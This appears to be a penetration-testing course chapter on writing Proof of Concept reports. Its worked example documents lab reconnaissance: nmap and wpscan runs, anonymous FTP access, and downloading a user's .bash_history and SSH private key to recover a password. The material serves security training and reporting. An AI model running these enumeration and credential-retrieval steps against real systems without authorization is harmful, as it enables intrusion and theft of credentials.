# 19 - Proof Of Concept


## 1. What is a Proof of Concept?

A **Proof of Concept (PoC)** is a detailed, step-by-step documentation of an entire attack chain, from initial reconnaissance to final exploitation or privilege escalation.

*   **Purpose:**
    *   To **validate** that a vulnerability is real and exploitable.
    *   To provide the client's technical team with a clear "recipe" so they can **reproduce** the issue themselves.
    *   To serve as the primary **evidence** for the findings in the final report.
*   **Analogy:** The famous quote, "Give me six hours to chop down a tree, and I'll spend the first four sharpening the axe," applies perfectly here. The meticulous notes you take during the engagement are the "axe sharpening." The PoC is the final, efficient process of "chopping down the tree."

---

## 2. Structuring a Proof of Concept

A well-structured PoC is easy to follow and logically organized. A best practice is to structure it according to the phases of the penetration testing process. A complete PoC would cover all stages, but here we will focus on the initial phases for the Linux target.

### Example PoC Structure:

1.  **Summary of Findings:** A high-level overview of the critical vulnerabilities discovered.
2.  **Phase: Information Gathering & Vulnerability Assessment:** Detailed commands and their output.
3.  **Phase: Exploitation / Initial Access:** The exact steps taken to gain access.
4.  **Phase: Post-Exploitation (Enumeration & Privilege Escalation):** Commands run after gaining a foothold.
5.  **Phase: Pillaging:** Commands and findings after achieving root access.

---

## 3. Example PoC: Linux Target - Information Gathering

This section demonstrates how to document the initial reconnaissance and vulnerability analysis for the Linux target.

### 0. Summary
A brief summary of the key findings from this phase.
*   **FTP:** Anonymous access was enabled, exposing the home directory of a user named `john`.
*   **Critical Files Found:**
    *   `.bash_history` revealed potential credentials: `john:SuperSecurePass123`.
    *   An unencrypted SSH private key (`id_rsa`) for `john` was downloaded.
*   **WordPress:** An outdated `hash-form` plugin (v1.1.0) was identified, which is vulnerable to a known RCE (CVE-2024-5084).

---
### 1. Port & Service Discovery
This step identifies all open ports and running services.
```shell
# Command
sudo nmap -p- -sV 10.129.12.10 -T5 --open

# Output
Starting Nmap...
...
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      ProFTPD
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu
443/tcp open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
...
```

---
### 2. Identifying Low-Hanging Fruits
This step focuses on the most promising services for deeper enumeration.
```shell
# Command
sudo nmap -p21,443 -sC 10.129.12.10

# Output
...
PORT    STATE SERVICE
21/tcp  open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_ -rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt
443/tcp open  https
|_http-generator: WordPress 6.7.2
...
```

---
### 3. WordPress Enumeration
This step uses a specialized tool to analyze the WordPress installation.
```shell
# Command
wpscan --url https://10.129.12.10 --disable-tls-checks -e p

# Output
...
[+] hash-form
 | ...
 | [!] The version is out of date, the latest version is 1.2.4
 | ...
 | Version: 1.1.0 (100% confidence)
...
```

---
### 4. FTP Enumeration and Data Exfiltration
This step details the manual interaction with the FTP server to download sensitive files.
```shell
# Command
ftp 10.129.12.10

# FTP Session
Name: anonymous
Password: anonymous
ftp> ls -al
...
-rw-------   1 john     john         1153 Feb 15 21:13 .bash_history
drwxrwxr-x   2 john     john         4096 Feb 12 13:55 .ssh
...
ftp> get .bash_history
ftp> cd .ssh
ftp> get id_rsa
ftp> exit
```

---
### 5. Analysis of Exfiltrated Data
This step shows the contents of the downloaded files, which confirm the critical vulnerabilities.
```shell
# Command
cat .bash_history

# Output
...
echo "john:SuperSecurePass123" | sudo chpasswd
...

# Command
cat id_rsa

# Output
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

This structured approach, combining commands, their output, and a summary, creates a clear and professional PoC that is easy for a client's technical team to follow and verify.
